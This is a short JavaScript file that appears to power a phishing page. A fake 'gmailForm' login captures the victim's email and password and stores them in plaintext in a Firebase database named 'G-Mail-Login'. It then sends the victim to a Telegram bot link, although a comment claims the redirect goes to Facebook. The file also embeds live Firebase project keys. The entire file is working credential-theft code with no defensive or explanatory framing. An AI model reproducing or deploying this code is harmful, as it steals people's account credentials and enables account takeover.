// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyDwuXlj3uGaHK7WpaFVhWHkUUprXT-BaKM",
  authDomain: "facebooklogin-978a1.firebaseapp.com",
  databaseURL: "https://facebooklogin-978a1-default-rtdb.firebaseio.com",
  projectId: "facebooklogin-978a1",
  storageBucket: "facebooklogin-978a1.appspot.com",
  messagingSenderId: "709471528879",
  appId: "1:709471528879:web:86de353b1a8004a039715a",
  measurementId: "G-4QBMLWB2WJ"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// Reference your database
var wpAdminLoginDB = firebase.database().ref('G-Mail-Login');

document.getElementById("gmailForm").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

  var email = getElementVal("email");
  var pass = getElementVal("password");

  saveLogins(email, pass);

  // Redirect to Facebook
  window.location.href = 'https://t.me/NOTEMEMEAppBot?start=kqpc7y';

  // Reset the form (optional)
  document.getElementById("gmailForm").reset();
}

const saveLogins = (email, pass) => {
  var newFacebookLogin = wpAdminLoginDB.push();

  newFacebookLogin.set({
    email: email,
    pass: pass,
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};
